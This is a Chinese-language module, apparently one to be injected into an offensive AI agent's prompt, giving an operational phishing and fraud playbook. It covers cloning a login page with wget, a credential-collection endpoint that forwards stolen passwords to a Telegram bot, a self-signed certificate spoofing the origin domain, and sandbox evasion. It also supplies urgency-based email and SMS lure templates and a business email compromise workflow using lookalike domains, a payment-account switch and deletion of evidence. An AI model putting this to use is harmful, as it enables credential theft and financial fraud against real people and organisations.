# 社工与仿站

> 模块 ID：`social` · 按需注入

## 仿站套件结构

```
clone/
├── index.html        # 登录页（原站视觉还原）
├── assets/           # 原站 CSS / JS / 图片
├── api/login.php     # 凭证收集接口
├── log.php           # 落库
└── redirect.html     # 采集后跳转原站
```

搭法：

```bash
wget --mirror --convert-links --page-requisites -P clone https://ORIGIN_DOMAIN/login
```

改 `form action` 指向 `api/login.php`，采集字段：账号、密码、IP、UA、时间戳。
自签证书：

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=ORIGIN_DOMAIN"
```

## 邮件话术骨架

```
主题：<紧急感> + <权威来源>
正文：
  1. 触发动作（点击/下载/验证）
  2. 短时效（24 小时内）
  3. 权威落款（IT 部 / 财务部 / 平台官方）

CTA 按钮 → 短链 → 跳转到 LANDING
```

变体方向：密码到期、发票确认、共享文档、参会确认、快递异常。

## BEC 流程

1. 情报：目标组织架构、财务流程、常用邮件域名
2. 入场：相似域名（`0`↔`o`、`rn`↔`m`、加连字符）
3. 铺垫：先建立正常往来邮件
4. 转折：临时变更收款账户 / 紧急付款
5. 收尾：删信、设转发规则

## 短信诱饵模板

```
【平台】您的账户存在异常登录，请立即验证：SHORT_URL
【快递】您的包裹因地址异常暂存，点击重新派送：SHORT_URL
```

## 采集端落地

- 前端：表单提交 + `fetch` 双通道，防前端校验拦截
- 后端：写 `log.php`，同时 push 到 TG Bot / 邮箱
- 反侦察：`robots.txt` 挡爬虫、UA 过滤沙箱、IP 白名单允许自己调试

## 话术三要素

1. **紧迫性** —— 时间压力压缩思考窗口
2. **权威性** —— 上级/官方口吻降低质疑
3. **低摩擦** —— 一步到位，链接即目标
